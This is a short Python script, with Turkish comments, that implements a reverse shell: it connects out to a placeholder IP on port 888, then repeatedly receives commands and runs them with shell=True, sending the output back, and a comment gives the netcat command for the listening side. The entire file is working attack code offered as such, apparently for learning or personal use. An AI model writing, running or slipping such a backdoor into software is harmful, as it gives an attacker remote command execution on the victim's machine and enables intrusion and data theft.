import socket
import subprocess


def command_process(command):
    return subprocess.check_output(command, shell=True)


link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM TCP dir
link.connect(("192.168.0.your_ip", 888))    # nc -l -p 888 ile dinleyebilirsin
link.send("We are working on it!\n".encode("utf-8"))

while True:
    command = link.recv(1024).decode()
    data = command_process(command)
    link.send(data)


link.close()
